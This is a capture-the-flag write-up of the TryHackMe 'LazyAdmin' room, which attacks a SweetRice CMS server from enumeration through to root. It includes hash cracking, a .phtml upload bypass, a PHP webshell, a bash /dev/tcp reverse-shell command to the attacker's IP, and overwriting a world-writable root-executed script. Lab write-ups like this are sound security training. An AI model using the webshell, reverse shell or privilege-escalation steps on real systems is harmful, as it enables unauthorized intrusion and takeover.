# TryHackMe – LazyAdmin
## Scope

This room simulates a vulnerable Linux web server hosting a PHP-based CMS (SweetRice).
The objective was to obtain:

User flag

Root flag

The attack chain involved:

Web enumeration

Credential disclosure

Authenticated file upload → RCE

Local privilege escalation via sudo misconfiguration

Target IP: 10.65.184.12
Attacker IP: 192.168.176.64

## Phase 1 – Initial Reconnaissance
### Port Scan
nmap -sC -sV -Pn 10.65.184.12

Results

Open ports:

22/tcp – OpenSSH 7.2p2 (Ubuntu)

80/tcp – Apache 2.4.18 (Ubuntu)

Port 80 (HTTP) was identified as the primary attack surface.

The Apache default page was still present, indicating minimal hardening and suggesting further web enumeration was necessary.

## Phase 2 – Web Enumeration
### Directory Brute Force
gobuster dir -u http://10.65.184.12 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt

Findings

/content/

index.html

Browsing /content/ revealed a SweetRice CMS installation.

Further manual exploration showed that directory listing was enabled in:

/content/inc/

This exposed a backup directory:

/content/inc/mysql_backup/

## Phase 3 – Information Disclosure

The SQL backup file contained CMS configuration data, including:

Admin username: manager

Password hash (32-character hexadecimal)

The hash length suggested MD5.

## Phase 4 – Credential Attack

The hash was cracked offline using hashcat:

hashcat -m 0 <hash> /usr/share/wordlists/rockyou.txt

The password was successfully recovered.

This allowed authentication at:

/content/as/ (Standard directory for admins)

Authenticated administrative access to the CMS was obtained.

## Phase 5 – Remote Code Execution

Within the SweetRice admin panel, a Media Center upload feature was identified.

### Upload Testing

test.txt → accepted

shell.php → blocked

shell.phtml → accepted

Apache commonly interprets .phtml as PHP, making it a viable bypass.

### Webshell

Uploaded file:

shell.phtml

Contents:

<?php system($_GET['cmd']); ?> (so just opening a shell)

RCE verification:

http://10.65.184.12/content/attachment/shell.phtml?cmd=id

Successful execution confirmed server-side command execution as user:

www-data

## Phase 6 – Reverse Shell
Listener (Attacker)
nc -lvnp 4444

Trigger
http://10.65.184.12/content/attachment/shell.phtml?cmd=bash -c 'exec bash -i &>/dev/tcp/192.168.176.64/4444 <&1'

A reverse shell was obtained as:

www-data

## Phase 7 – User Enumeration
whoami
ls -la /home

Discovered local user:

itguy


User flag located at:

/home/itguy/user.txt

Flag successfully retrieved.

## Phase 8 – Privilege Escalation
### Sudo Enumeration
sudo -l


Output revealed:

(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

This allowed execution of a Perl script as root without a password.

Script Analysis
cat /home/itguy/backup.pl

Contents:

system("sh", "/etc/copy.sh");

The script executed /etc/copy.sh as root (root revealed by sudo -l command earlier).

File Permission Analysis
ls -la /etc/copy.sh

Permissions showed world-writable access:
-rw-r--rwx

The file was writable by others (including www-data).

### Exploitation

Overwrite /etc/copy.sh:

echo 'bash -p' > /etc/copy.sh

Execute privileged script:

sudo /usr/bin/perl /home/itguy/backup.pl

Root shell obtained.

## Phase 9 – Root Access

Verification:

whoami

Output:

root

Root flag located at:

/root/root.txt

Flag successfully retrieved.

## Kill Chain Summary
Service exposure (HTTP on port 80)
CMS discovery via directory enumeration
Public SQL backup disclosure
Offline hash cracking
Admin authentication
File upload bypass using .phtml
RCE → Reverse shell
Sudo misconfiguration discovery
Writable root-executed script abuse
Root shell obtained
Key Vulnerabilities Identified
Publicly accessible database backup
Weak MD5 password hashing
Insecure file upload filtering
Sudo misconfiguration
Writable root-executed script

## Lessons Learned
Directory listing frequently exposes sensitive artifacts.
Backup files are high-value targets.
Hash length analysis is critical for correct cracking.
Upload filters based only on extension are easily bypassed.
sudo -l must always be checked immediately after gaining shell access.
Writable files executed by root are a direct privilege escalation path.
Kernel exploits are often unnecessary when misconfigurations exist.

## Conclusion
This room demonstrated an attack chain combining:
Web enumeration
Credential compromise
Authenticated RCE
Local privilege escalation via misconfiguration
